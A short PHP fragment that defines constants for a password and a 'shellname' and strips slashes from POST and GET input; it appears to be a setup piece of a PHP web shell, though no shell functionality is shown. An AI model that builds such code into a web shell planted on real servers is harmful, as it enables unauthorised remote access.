<?php
define('envlpass',$password);
define('shellname',$shellname);

if(@get_magic_quotes_gpc()){
	foreach($_POST as $k => $v) $_POST[$k] = stripslashes($v);
	foreach($_GET as $k => $v) $_GET[$k] = stripslashes($v);
}
?>